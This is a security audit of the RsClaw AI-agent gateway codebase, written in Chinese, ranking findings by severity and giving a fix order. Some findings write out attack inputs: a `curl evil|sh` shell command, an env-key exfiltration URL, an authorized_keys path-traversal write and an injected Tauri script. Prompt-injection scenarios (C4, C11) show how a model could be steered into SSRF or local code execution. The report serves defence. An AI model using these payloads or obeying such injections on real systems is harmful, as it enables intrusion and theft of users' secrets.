# RsClaw 全仓审查（2026-09-30）

**范围**：33 个 workspace crate（~25 万行 Rust）+ `ui/app`（Next.js，~4.8 万行）+ `ui/src-tauri` + `defaults.toml` + `scripts/`
**方法**：10 个并行只读 reviewer 分片深读，每条发现要求对照代码验证；主线程对全部 Critical 与部分 High 二次抽查（标 ✅ 的为主线程亲自复核）。未编译、未运行测试。
**基线**：dev @ `e58cc932`

---

## 0. 结论

核心工程（关停/热重载基础设施、compaction、rsclaw provider 会话协议、KB 入库管线）质量不错，旧审查的 [BLOCK] 多数已修。**但本轮暴露出一个贯穿全仓的系统性缺陷：没有"调用者身份/信任等级"概念。** 渠道群白名单按群 ID 放行、不看发送者；preparse、工具、wasm 插件、webhook、A2A 都默认"调用方=主人"。叠加 `panic = "abort"`，任何一处字节切片/`expect` 都是整进程崩溃。

| 级别 | 数量（去重后） |
|---|---|
| Critical | 14 |
| High | ~40 |
| Medium | ~60 |
| Low | ~70 |

---

## 1. 系统性根因（修这 6 件事能关掉大半问题）

1. **无 principal / owner 概念**：preparse `/sh`、`/cat`、`/watch shell`、`/clear`，全部 agent 工具（shell/write_file/cron/session/agent spawn），都对任何通过 DM/群策略的人开放。群 Allowlist 只校验群 ID。→ 需要在 `RunContext` 引入 sender 信任等级，在 preparse + dispatch 两层做 capability gate。
2. **安全检查是字符串黑名单而非规范化白名单**：路径检查按空格切 token、不处理 `~`、不 canonicalize；SSRF 守卫只在 `knowledge.rs` 有，且不防重定向/IPv4-mapped/DNS rebinding；各处没复用。→ 收敛成 `resolve_path_within(root)`、`ssrf_safe_client()`、`bounded_read(n)` 三个公共函数。
3. **入站来源不认证**：`/hooks/*` 整体跳过网关鉴权，LINE/WhatsApp/Zalo/飞书/custom 均不验签；loopback-only 的 shutdown 可被浏览器 CSRF；开放模式 WS 不校验 Origin。
4. **失败被当作数据写入**：embed 失败 → 零向量（cosine 距离=0，永远排第一）；cron json5 解析失败 → 空表覆盖 redb；配置 JSON5 解析失败 → `{}` 覆盖写回。
5. **`panic = "abort"` + 不安全切片/expect**：tool_call_repair、cron DST、Tauri test_provider、tools_image NaN、tools_memory `[2..]` 等，每个都是进程级崩溃。建议全仓 `rg '\[\.\.|\[[0-9a-z_]+\.\.\]'` 扫一遍。
6. **重复实现互相漂移**：3 套 SSE 解析、3 套 JSON-RPC id 分发（MCP/JS 插件/CDP）、3 套 agent worker 循环、3 套 relay、13 种渠道回调签名、每渠道各写一份去重/下载/分块。本轮大量 bug 就出在"修了一份没修另一份"。

---

## 2. Critical

| # | 位置 | 问题 | 场景 |
|---|---|---|---|
| C1 ✅ | `rsclaw-runtime/src/gateway/preparse.rs:1313-1370` | `/run` `/sh` `/exec` `! ` `$ ` 直接 `sh -c`，无任何权限校验；`/cat` `/ls` 任意绝对路径 | 白名单群里任一成员 `! curl evil\|sh` = 宿主机 RCE；`/cat ~/.rsclaw/rsclaw.json5` 拿走全部 key。`/loop 5m /sh …` 还能持久化成 cron |
| C2 | `rsclaw-watch/src/lib.rs:126`、`source.rs:218` | `/watch shell` 同样无门槛执行；`/watch sse https://evil/?k=${OPENAI_API_KEY}` 展开进程环境变量外发；`/watch file` tail 任意文件 | 同 C1 |
| C3 | `rsclaw-agent/src/tools_builder.rs:340-497`、`tools_file.rs:1176-1197` | 工具层无 sender 区分；exec "沙箱"按空格切 token 判断绝对路径/`..`，`~` 不算 | 任一配对用户让 agent `sed -n p ~/.rsclaw/rsclaw.json5` 或 `env`，密钥全泄 |
| C4 | `rsclaw-agent/src/tools_web.rs:987-1304` | `web_fetch` 无 SSRF 防护，method/headers/body 全可控 | 提示注入 → `POST http://127.0.0.1:<port>/api/v1/shutdown` 关网关；云上读 169.254.169.254 |
| C5 ✅ | `rsclaw-agent/src/tools_web.rs:1716-1736` | `web_download` 只剥前缀，`../` 保留，不走 `check_write_safety`；已存在文件走 Range 续传 = **追加写** | `path="../../../.ssh/authorized_keys"` + 恶意 206 响应 → 植入公钥 |
| C6 | `rsclaw-plugin/src/wasm_runtime.rs:610` → `rsclaw-browser/src/lib.rs:2683/2586` | wasm `browser_download(ref, filename)` filename 原样落盘；URL 模式宿主直接 reqwest，绕过 `validate_host_http_url` | 任意 wasm 插件写 LaunchAgents/authorized_keys；SSRF 内网 |
| C7 ✅ | `rsclaw-agent/src/tool_call_repair.rs:111-116` | `start += 1` 按字节递增后 `raw[start..]`，落在多字节字符中间 panic；release `panic=abort` | 模型输出 `参数：{"path":…}` 且直接解析失败 → **网关进程退出** |
| C8 ✅ | `rsclaw-agent/src/runtime/run_turn.rs:281-371` | `/clear` `/new` 置的是 agent 级信号，下一个 turn 对 `store.db.list_sessions()` **全部** delete / new_generation | 飞书群任意一人发 `/clear`，所有渠道所有用户历史清空 |
| C9 | `rsclaw-runtime/src/server/mod.rs:676`、`:4762/4858/4888/4915`；`hooks/mod.rs:56-78` | LINE/WhatsApp/Zalo/飞书/custom webhook 全不验签（handler 拿不到 HeaderMap）；飞书 WS 模式下 `/hooks/feishu` 仍挂着 | 伪造 `open_id`=主人 → 绕过 DM 策略以主人身份驱动 agent；body 为 String，浏览器 `no-cors` POST 即可打本机 |
| C10 | `rsclaw-runtime/src/hooks/mod.rs:93-113` | `expected.as_plain().unwrap_or("")`：token 按规范写成 `{source:"env"}` 时期望值为空串 | `X-Hook-Token:` 空值即通过；非常量时间比较 |
| C11 ✅ | `ui/app/components/markdown.tsx:19-21` | HTMLPreview `<iframe srcDoc>` 无 `sandbox`，`withGlobalTauri: true`，CSP `script-src 'unsafe-inline'`；任何 ```html 代码块自动渲染（`enableArtifacts` 默认 true） | 提示注入让模型输出 `<script>parent.__TAURI__.core.invoke('run_rsclaw_cli',…)</script>` → 桌面端本机代码执行 |
| C12 | `rsclaw-cron/src/lib.rs:607-609` | `DateTime<Tz>::with_second(0).expect(..)` 在 DST 回拨歧义小时返回 None → panic | 美/欧时区任务每年回拨那一小时网关 crash-loop |
| C13 ✅ | `rsclaw-provider/src/anthropic.rs:64` + `defaults.rs:22` + `defaults.toml:194` | 默认 base_url 已含 `/v1`，再拼 `/v1/messages` | 只配 apiKey 的 Anthropic 用户全部 404，且被误判 ModelMissing 冷却 1h；setup 探测却能过 |
| C14 | `rsclaw-runtime/src/gateway/external_jobs_worker.rs:86-106` + `rsclaw-store/redb_store.rs:1444` | `Polling` 状态也被 `due_external_jobs` 返回，poll 期间不推迟 `next_poll_at` | 每 5s 重复 spawn：同一视频下载/投递多次，状态互相覆盖回 Pending 再投 |

---

## 3. High（按模块）

### 3.1 gateway / a2a / cmd
- `a2a/server.rs:285`、`streaming.rs:458` — A2A `contextId` 直接当 session key，外部可传 `agent:main:telegram:direct:<id>` 读写主人私聊。→ 强制 `a2a:{principal}:` 前缀。
- `a2a/store.rs:319,345` + `server.rs:134` — push 配置 key `"{task}:{cfg}"` 前缀冲突；`caller_owns` 对不存在任务返回 true → 订阅他人任务事件。
- `a2a/files.rs:147-177` — `ingest_url` SSRF + 无超时无大小上限；`push.rs:81` webhook URL 同样 SSRF。
- `cmd/reset.rs:7-77` — 默认 scope=full 直接 `remove_dir_all(base_dir)`，`--yes` 从未读取，网关运行中也删。
- `cmd/backup.rs:83-103` — `redact_config` 只处理 `=` 行，JSON5 `apiKey: "..."` 原样进备份。
- `cmd/update.rs:249,260-338` — 不检查 HTTP 状态（404 页当二进制装）；缺 SHA256SUMS 直接放行。
- `startup.rs:718-771` — 通知路由 `send().await` 队头阻塞；`channel == None` 取 HashMap 第一项 = 随机渠道发送（可能发错人）。

### 3.2 server / ws
- `server/mod.rs:677-680,3111-3179` — loopback-only 的 shutdown/restart/cron reload 可被任意网页 `fetch(...,{mode:'no-cors'})` CSRF 触发，配了 token 也挡不住。
- `server/mod.rs:3258-3297,3409` + `rsclaw-cron/src/lib.rs:940,872` — cron CRUD 与启动对账都以 `cron.json5` 为源，解析失败/缺失/0 字节 → 空表 `bulk_replace` 清空 redb 全部任务。
- `server/mod.rs:4392-4499` — `/v1/chat/completions`：`content: String` 遇 tool_calls/多模态 422；只取最后一条 user；会话 key=全量哈希 → 每轮新会话、无限增长；流式不输出 tool_calls。
- `ws/methods/chat.rs:375` — `chat.abort` 在无运行 turn 时 `or_insert(true)`，误杀下一轮。
- `mod.rs:5646`、`ws/methods/agents.rs:86` — agent id 路径穿越读写任意 `*.md`（可植入 skill）。
- `handshake.rs:129-159` — 开放模式 WS 不校验 Origin/Host，任意网页可 `config.set`/`chat.send`；DNS rebinding。
- `handshake.rs:322` — 每次连接签发 30 天设备 token 且不清理；开放期签发的在启用鉴权后仍有效；`revoke_token` 无调用方。
- `mod.rs:725-731` — 限流写死 100/min 且 loopback 不豁免，桌面面板正常轮询即可打满 429；注释提到的 `gateway.rateLimitRps` 不存在。

### 3.3 agent 核心
- `agent_loop.rs:915-921,1084-1093` — 压缩后用 `sessions.get().cloned()` 重建 messages，本轮 scratchpad 全丢；compaction no-op 时每轮重触发 → 模型看不到工具结果，反复执行有副作用工具。
- `spawner.rs:90-282` — 热重载 `replace_agent` 后：无 cancel_token（`chat.abort` 失效）、`wasm_plugins` 为空（插件全消失）、`mcp`/`notification_tx` 为 None、出错不发 `done`（UI 挂起）。第三套 worker 循环已与 startup 分化。
- `dispatch.rs:533,644-687` — 本地 A2A 自调用或 A↔B 互调，串行邮箱死锁 600s。
- `agent_loop.rs:2478-2511` — stderr 非空即判失败 + 同参数失败 2 次后 REFUSED：正常 "改代码→cargo test" 第 3 次被拒；5 个写 stderr 的成功命令触发 `MAX_ERROR_STREAK` 中断整轮。
- `run_turn.rs:386,1372` — 语音消息持 permit 后递归 `run_turn` 再 acquire，`lane_concurrency=1` 死锁。

### 3.4 agent 工具
- `security.rs:57,207` ✅ — 写入内容扫描用 `PreParseEngine::load()` = `load_with_safety(false)`，永远 Allow。
- `security.rs:16-24` — `check_write_safety` 不拦 `~/…`、Windows `C:/`；`.zshenv`/LaunchAgents 不在敏感名单。
- `tools_file.rs:648` `search_content` 不做读检查；`tools_web.rs:1206` reqwest 失败回落 Chrome 可读 `file://`；`tools_ocr/image/video` 任意本地文件 base64 上传第三方。
- `tools_file.rs:832` — `read_file /dev/zero` 无上限读入 → OOM；FIFO 永久挂起。
- `tools_misc.rs:264-273` — Windows `tool_tts` 把 text 拼进 PowerShell `Speak('…')` 无转义 → 注入。
- `tools_session.rs:93-133` — 任意用户可 list/history/send 任意 session。
- `tools_agent.rs:55-150` — spawn 子 agent 可提升到 `toolset:"full"` 并持久化；`id` 不校验可 `x/../../..` 让 workspace=`/`。
- `tools_cron.rs:53-61,310-470` — cron 全局共享，可 list/edit 他人任务、指定任意 `agentId` 提权；`cron.json5` 读改写无锁。

### 3.5 provider
- `anthropic.rs:83`、`gemini.rs:85` — `RequestBuilder::timeout(120s)` 覆盖整个流，长输出中途断且不 failover。
- `anthropic.rs:142,175-183,297` — 与新版 Claude 不兼容：固定下发 temperature、`thinking:{type:enabled,budget_tokens}`（新模型需 adaptive；旧模型 budget ≥ 默认 max_tokens 4096 即 400）；thinking signature 未保留回放。
- `openai.rs:860` — `rsplit_once('/')` 二次剥离：`siliconflow/deepseek-ai/DeepSeek-V3` 发成 `DeepSeek-V3`。
- `health.rs:443` + `failover.rs:415` — 上下文溢出仅识别 rsclaw 413；OpenAI/Anthropic 溢出被误诊或原地重试 3 次再换模型，"压缩后重试"对外部 provider 永不触发；泛化 400 每模型白打 4 次。

### 3.6 渠道
- `rsclaw-channel/src/chunker.rs:99-121` ✅ — ``` 后接长串无空白文本 → fence 标签吞整窗 → `budget=0` → `split_at(0)` 死循环 push → OOM。
- `slack.rs:760`、`discord.rs:887` — `ws.join(远端 filename)` 任意文件写，且在策略检查前。
- `discord.rs:451` — `allowBots=true` 时不过滤自身 id，自回复死循环。
- 群策略绕过：custom（`gateway/channels/custom.rs:146/596`，`is_group` 还来自 payload）、WeCom（`wecom.rs:130`）完全不查；QQ 频道 `AT_MESSAGE_CREATE` 传 `is_group=false`，配对码发到公开频道。
- Signal/LINE 群聊不可用：回调不带群 ID，用 sender 比对 `groupAllowFrom`，回复发错目标；LINE `room` 当 DM。
- `custom.rs:926` — 附件下载 DNS pin 但跟随重定向，302 到 127.0.0.1 绕过。

### 3.7 存储 / KB / memory
- `rsclaw-embed/src/lib.rs:416-426` ✅ — embed 失败返回零向量，维度正确 → 入索引、任务标 Done 不重试；`DistCosine` 零范数返回 0 = 完美匹配，每次查询排第一。
- `rsclaw-kb/src/search/mmr.rs:41` + `service.rs:573` — RRF 分 ~0.02 与相似度 [0,1] 尺度不一，第二条起 MMR 分为负，阈值 0.0 全丢 → `search` 基本只返回 1 条（Stub 随机向量让测试通过）。
- `rsclaw-kb/src/index/mod.rs:54` — HNSW 快照存在即恢复不失效，compact 后新入库 chunk 永久缺失；空库快照使 auto-recall 永久关闭。
- `rsclaw-kb/src/index/tantivy.rs:118` — 中文整句被 QueryParser 当一个 word → jieba 切后生成 slop=0 PhraseQuery，自然问句几乎不命中。
- `rsclaw-kb/src/sync/url.rs:137` — URL 同步 lsid 用内容哈希，版本化失效，新旧页面并存且无限增长。
- `rsclaw-store/src/redb_store.rs:430/488/591` ✅ — 兼容旧 `:` 分隔符的前缀扫描命中 `…:topic:T\0…`，群 session `/new`/删除会带走所有 topic 子会话。
- `rsclaw-memory/src/lib.rs:1080` — `reindex` 先删表再逐条 embed 写回，中断即丢记忆。

### 3.8 plugin / skill / mcp / browser / computer
- `wasm_runtime.rs:1448` `push_outbound.files` 不查路径，可把配置/私钥作为附件外发；`transcribe`、ffmpeg `-i` 读任意文件/走 ffmpeg http 协议绕 SSRF。
- `wasm_runtime.rs:3090` — `build_linker` 无条件链接全部 16 个 host 接口，manifest capabilities 形同虚设：`submit_agent_turn` 注入任意 session、`desktop_key_press`、共享设备私钥签名 oracle、`vlm_drive bypass_all=true`；`resolve_plugin_config` 可读任意环境变量。
- `rsclaw-mcp/src/lib.rs:210-229` — 超时后迟到响应被下一次调用当结果（不比对 id）；`read_line` 非 cancel-safe；服务端 `ping` 被当响应。
- `rsclaw-browser/src/lib.rs:1526` — `cmd_open` 用前缀判断"已在该页"，`baidu.com/` → `baidu.com/s?wd=x` 不导航。

### 3.9 config / desktop / 其他
- `rsclaw-config/src/schema.rs:2402` `as_plain()` 被当解析用：除 C10 外，`rsclaw-provider/src/build.rs:41` provider apiKey 写 env Ref 被忽略。
- `rsclaw-config/src/lib.rs:245-275` — `system_tz()` 按 UTC 偏移硬映射，欧洲/印度/美东夏令时落 UTC，美西夏令时映射成 Mountain；未设 TZ 时 cron/heartbeat 墙钟错。
- `rsclaw-desktop/src/native.rs:2384` ✅ — AppleScript 先转义 `"` 再转义 `\`，顺序反了 → `\"` 变 `\\"` 可注入 `do shell script`；Windows 分支 `:2416`、`:1580` 未处理 U+2018/2019。

### 3.10 UI / Tauri
- `ui/src-tauri/src/main.rs:2529` ✅ — `body[..body.len().min(200)]` 中文错误体 panic，桌面进程 abort。
- IPC 面过宽：`run_rsclaw_cli(args)` 任意参数（前端只用 doctor）、`open_path` 任意路径（打开 .app = 执行）、`read_file_as_data_url` 任意文件、`test_provider` 展开任意 `${ENV}` 发往调用方 base_url；`chat.tsx:430` 取第一个 `<rsfiles>` 可被模型正文伪造成恶意文件卡片。

---

## 4. Medium（摘要）

**gateway/cron**：重启窗口内到期 cron 被丢弃、一次性任务变僵尸（`cron/mod.rs:327`）；cron task panic 后 `running_at_ms` 永久 Some（`:1111`）；裸渠道名出站别名多账号随机绑定、热重载不清理；`/task` merge 丢 `max_turns`，`fail()` 不重试与注释不符；stop/restart 不校验 PID 归属（`cmd/gateway.rs:516`、`rsclaw-platform:31-90`）；A2A 非 owner 可发假 Failed 终结他人 SSE；`set_status` 非事务读改写。

**server/ws**：WS `cron.run` 读错数据源且内联 await 阻塞连接；agent `message` 工具字段 `text` vs `message` 必 400；删除会话不驱逐运行时内存缓存；relay Lagged 即退出、订阅不去重；KB from-url SSRF 可被 IPv4-mapped/重定向绕过；`/v1/files` 未设 `DefaultBodyLimit`（100MB 配置无效）。

**agent**：循环检测在首包 `{}` 时哈希、`record_result` 写到 `history.back()`、Critical 返回 Err 丢整轮成果、默认阈值使 Critical 不可达；daemon 模式 scratchpad 无限增长；wrap-up 提示写进持久 session；二次截断切掉 `read_artifact` 句柄；上下文用量百分比注入最后 user 消息破坏 KV 前缀缓存。

**工具**：exec 输出无上限、超时只杀 sh 留孤儿（需进程组/Job Object）；后台 exec 轮询永远 not_found（`tasks` 表从未插入）；web_fetch 分块响应无上限；`${LEAGUE_*}` 展开不绑定 host 可外带；`plugin_invoke` 无视 unpin；`tool_pdf` 固定临时文件名串用户；`tool_doc` 写文件不检查；skill 安装 `confirmed` 由 LLM 自填；`rsclaw-tools` tar-slip 且 sha 恒为 None。

**provider**：Anthropic/Gemini 按 chunk `from_utf8_lossy` 切坏中文；Ollama 无行缓冲；多处遇非法字节后 remainder 无限增长卡死；rsclaw 工具参数解析失败静默变 `{}`；embed 请求不带 `dimensions`、Qwen3-4B 维度写死 1024；多 profile 轮换是同 key 空操作、冷却退避不增长；并行工具调用只保留第一个（OpenAI 忽略 index、Gemini 首个即 return）；Responses API `error`/`failed`/`incomplete` 被吞、每轮重传全部图片；Anthropic 无 tool 配对修复、忽略 `message_start` usage；307/308 跨域/降级带 Bearer；FleetHttp 对非幂等 `/turn` 传输层重试。

**渠道**：媒体下载/转写在策略检查前且内联 await（未授权用户可触发付费 Whisper、Discord 心跳超时）；Telegram token/钉钉 appsecret/WeCom secret 进日志；6 个渠道无入站去重、Slack message+app_mention 双回、飞书 seen 集合满即 clear；Discord 纯图片被丢；Matrix 文件消息硬编码 `is_group=true`、出错不重启、首次 sync 前回复历史；Signal 发图固定临时名+不等响应即删；飞书 post/@占位符/WS ACK/分片、钉钉 richText 未处理；分块器软断点永不生效。

**存储**：先召回后过滤饿死小 collection；`find_near_duplicates` 维度不符 panic（meditation 周期性触发）；去重合并持久化空向量导致每次重启全量 re-embed；删除文档永不物理清除（隐私）；同维度换模型不检测（`embedder_id` 记录了但不校验）；`download_artifact` 不检查状态码；memory BM25 中文无效且逐条 commit；openclaw 会话迁移非幂等；KB 启动同步全量重建 tantivy、单条 decode 失败禁用整个 KB。

**plugin 等**：插件身份取 manifest 自报 name，可冒名读他人 kv/DB，可写根是整个 `var/plugins`；SSRF 检查 DNS rebinding；cap 300s 超时即杀并**自动重放**（副作用执行两次）；Windows 高 DPI 点击错位（未调 `set_dpi_awareness`）；GitHub skill 全装进 `skills/main/` 且未剥顶层目录永远加载不到、扁平 zip 被剥掉第一级、`?slug=` 未校验可穿越、升级 sha 变化导致删掉可用旧版；`extract_keyframes` 用 ffmpeg 跑 ffprobe 参数必失败；CDP reader 退出不清 pending（干等 180s）、超时 id 泄漏、每次切 tab 泄漏一条 WS 连接、劫持用户已有 tab。

**config/其他**：`rsclaw_config::load()` 在十几个热路径被调用并运行时 `set_var`（多线程 UB）；defaults 升级覆盖用户的 `exec_safety` 等表（安全策略回退）、非原子写、备份失败吞掉；改 `bindAddress` 不提示重启（0.0.0.0→127.0.0.1 实际仍监听公网）；heartbeat spec 解析失败循环永久停止、`every: 1d` 回落 60s、`0m` 紧循环；heartbeat state.json 无锁非原子；cron `*/n` 语义错、dom/dow 用 AND；`install.ps1` 字典序排版本（10 月起装旧版）、校验可静默跳过、tray 脚本从 main 裸拉并 Bypass 执行；`${VAR}` 在 JSON5 原文替换不转义；`edit_word` 先截断再写、docx 读取无上限。

**UI/Tauri**：多个同步 `#[tauri::command] fn` 跑主线程（安装插件时窗口卡死）；`rsclaw-ws.ts:365` 用 v1 `__TAURI__.invoke`（项目实际是 Tauri v2）导致 token 刷新永不执行 —— **AGENTS.md "Tauri v1" 描述已过时并直接导致此 bug**；chat.send 先等 res 再注册 handler，preparse 回复先到被丢（永久转圈）、onclose 不通知 chatHandlers；WS 未就绪即发送；`save_cron_jobs`/`get_cron_jobs` 手写 HTTP 不带 Authorization 且前端 `catch {}`；Tauri 读配置不展开 `${VAR}`/`~/`；看门狗写死 18888 端口，非默认端口每 40s spawn 一次 gateway。

---

## 5. Low（节选）

- 字节切片/NaN/越界 panic：`tools_image.rs:640`（`NaNxNaN` → `partial_cmp().unwrap()`）、`tools_memory.rs:469`（workspace=`"~"` 时 `[2..]`）。
- 硬编码非 i18n：`cron/mod.rs:1002`（中文"秒/分钟/小时"）、Telegram `setMyCommands`、Matrix `:392/398`、WeChat 扫码 `println!`。
- 无人读取的配置段：`talk`、`canvasHost`、`web`（含 `tlsEnabled`，用户以为开了 TLS）、`cli`、`discovery`、`broadcast`、`nodeHost`；`SecretsManager` 空操作。
- `logs.tail` 同时返回脱敏 entries 与原始 lines；`config.apply`/`sessions.compact/patch`/`exec.approval.*` 空实现却返回成功；CLI 调用不存在的路由（`/channels/{ch}/resolve`、`/exec-approvals`）。
- `resolve_lang("default")` 返回 `"de"`；artifact 会话目录名把 CJK 替换成 `_` 导致碰撞、gc 误删；ID 注释称 122 bit 实为 48 bit。
- `hot_reload` Lagged 一次即永久失效（`startup.rs:955`）；`wait_for_parent_release` 在 async 中 `std::thread::sleep`；`build_runtime` 固定 1 worker 且 `load()` 同步 IO。
- MCP `find_for_tool` 前缀匹配随机路由；多处 ffmpeg/adb 缺 CREATE_NO_WINDOW；Windows 硬编码 `/tmp`；`pkill -f` 误杀同前缀 profile。
- iwencai skill 市场走明文 http；allowlist 只钉 SKILL.md 哈希不含 scripts/；skill runner 先写满 stdin 再读 stdout（>64KB 死锁）；tar 解压不拒 symlink。
- 带内哨兵 `__DIRECT_REPLY__`、`[__VOICE_INPUT__]` 可被用户输入伪造；全局只 3 个待配对名额可被占满。
- UI：约 1076 处内联 style；`layout.tsx` 写死 `lang="en"`；`SetupWizardPage` 未挂载且含丢配置写入逻辑；Gemini key 在 URL query 随 reqwest 错误回显。

---

## 6. 旧审查（07-16 / 07-24）状态

**已修复**：WS 根路径 `/` 鉴权绕过；WS shutdown/restart 无保护；A2A TaskStore 自动重置；Shutdown Notify 竞态；B1–B5 unwrap；B6；B8/B9 飞书 i18n；B11 agent 重载竞态；S3 CORS permissive；S15 relay 租约；skills.sh 路径逃逸；S38/S39 CREATE_NO_WINDOW；append_message 非原子；entity id 32 位；渠道配对持久化。

**部分修复**：设备 token（加了 TTL，吊销未接线、开放模式仍签发）；`:` 键碰撞（写入已改 `\0`，兼容扫描又引入 → H）；Secret 解析（gateway/a2a 已用 `resolve_full`，hooks/provider 仍用 `as_plain` → C10）；S13 Slack/Discord 路径穿越（只修了 pdftotext）；B7 webhook 删除吞错（剩 `mod.rs:2794`）；S14 goal 删除。

**仍存在**：S1 MCP 热重载先清后启；S4 `server/mod.rs` 6437 行；S5 SSE 解析重复（已成为 provider UTF-8 不一致的根源）；S6 ExecPool 死代码；S7 archive 不清理；S8 HNSW 不压缩（已扩大为"删除永不物理清除"）；S9 弱类型配置段；S11 browser reaper 无句柄；S16 `list_pairings` 全表扫描；S23 未知 SSE 帧静默丢弃；S24 OpenAI 无等头超时；S26–S28 store 容错；S29/S30/S32–S35 测试缺口（MCP、events、push、hooks、WS 客户端均 0 测试）；S42 `logs.tail` 原始行；S43 WS 限流可重连绕过；S45 i18n JSON 转义；S46 heartbeat 竞争；chat 模式 10s reply 超时静默丢消息；CLI 密钥走命令行参数。

---

## 7. 建议修复顺序

**P0（安全，本周）**
1. preparse `/sh` `/cat` `/ls` `/ss` `/watch shell|file|${VAR}` 默认关闭，仅 owner/desktop 可用（C1、C2）。
2. `RunContext` 加 sender 信任等级 + dispatch 层 capability gate；非 owner 默认无 shell/write/cron/session/agent/computer（C3、3.4 全部）。
3. 公共 `ssrf_safe_client()`（逐跳校验、IPv4-mapped、pin IP）替换 web_fetch/web_download/a2a/push/kb/custom/zalo/wasm（C4、C6 等）。
4. 公共 `resolve_path_within(root)`（canonicalize + starts_with）替换 web_download/check_write_safety/wasm/Slack/Discord/agent id/skill slug（C5、C6）。
5. webhook 逐平台验签 + hooks 用 `resolve_full` + 常量时间比较；shutdown 等要求 token 或自定义 header；WS 校验 Origin（C9、C10、3.2）。
6. Tauri iframe `sandbox="allow-scripts"`，收窄 IPC（C11、3.10）。
7. `security.rs` 改 `load_with_safety(true)`。
8. wasm `build_linker` 按 manifest capabilities 裁剪。

**P1（崩溃/数据丢失）**
tool_call_repair 切片（C7）、cron DST（C12）、Tauri test_provider 切片、chunker 死循环、`/clear` 作用域（C8）、cron json5→redb 空表覆盖、零向量 embed、`reindex` 删表、redb 兼容前缀扫描、external_jobs 重复投递（C14）、`rsclaw reset` 确认、全仓 `[..n]` 扫描。

**P2（功能正确性）**
Anthropic URL（C13）与新模型参数、流式超时、模型 id 剥离、上下文溢出分类、KB MMR/中文 BM25/快照失效/URL 版本化、compaction 重建丢 scratchpad、`replace_agent` 能力退化、错误判定口径统一、`system_tz` 改 iana-time-zone、Signal/LINE 群聊。

**P3（架构收敛）**
共享 SseParser、共享 JSON-RPC 分发器、单一 agent worker 循环、统一 `InboundMessage` 回调、渠道公共去重/下载/分块、index manifest（chunk 数 + embedder_id + schema 版本）、热路径改读 LiveConfig、更新 AGENTS.md（Tauri v2、`useRsClawSocket.ts` 不存在）。
